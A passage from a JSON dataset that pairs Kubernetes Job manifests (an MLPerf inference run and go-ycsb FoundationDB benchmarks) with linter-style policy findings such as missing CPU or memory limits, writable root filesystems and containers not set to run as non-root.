    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-2\nspec:\n  template:\n    metadata:\n      name: tf-ssdmobilenet-default-1024-2-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mlperf-inference-container\" has cpu request 0"
  },
  {
    "id": "00968",
    "manifest_path": "data/manifests/the_stack_sample/sample_0237.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-2\nspec:\n  template:\n    metadata:\n      name: tf-ssdmobilenet-default-1024-2-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mlperf-inference-container\" has memory limit 0"
  },
  {
    "id": "00969",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fdb-workloada\" does not have a read-only root file system"
  },
  {
    "id": "00970",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fdb-workloadb\" does not have a read-only root file system"
  },
  {
    "id": "00971",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fdb-workloadc\" does not have a read-only root file system"
  },
  {
    "id": "00972",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fdb-workloadd\" does not have a read-only root file system"
  },
  {
    "id": "00973",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fdb-workloade\" does not have a read-only root file system"
  },
  {
    "id": "00974",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fdb-workloadf\" does not have a read-only root file system"
  },
  {
    "id": "00975",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fdb-workloada\" is not set to runAsNonRoot"
  },
  {
    "id": "00976",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fdb-workloadb\" is not set to runAsNonRoot"
  },
  {
    "id": "00977",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fdb-workloadc\" is not set to runAsNonRoot"
  },
  {
    "id": "00978",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fdb-workloadd\" is not set to runAsNonRoot"
  },
  {
    "id": "00979",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fdb-workloade\" is not set to runAsNonRoot"
  },
  {
    "id": "00980",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
